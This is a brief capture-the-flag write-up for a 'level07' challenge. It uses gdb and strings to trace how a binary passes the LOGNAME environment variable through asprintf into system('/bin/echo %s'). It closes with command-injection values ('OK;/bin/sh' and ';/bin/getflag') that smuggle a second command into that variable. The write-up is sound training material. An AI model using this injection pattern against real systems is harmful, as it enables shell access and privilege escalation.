There is an binary which display level07 and doesnt seem to take any parameters or segfault after large strings

gdb level07
disas main

we can see that's it set permissions then call getenv, asprintf, system at the end

let's gather more informations with

strings level07

we can see all function call and also somewhere 'LOGNAME' which is an env variable and '/bin/echo %s'

let's see if we're correct

export LOGNAME=blabla

level07 binary now print blabla we're on the good way

since it call '/bin/echo %s'

we can exploit that like this :

export LOGNAME="OK;/bin/sh"
export LOGNAME=';/bin/getflag'
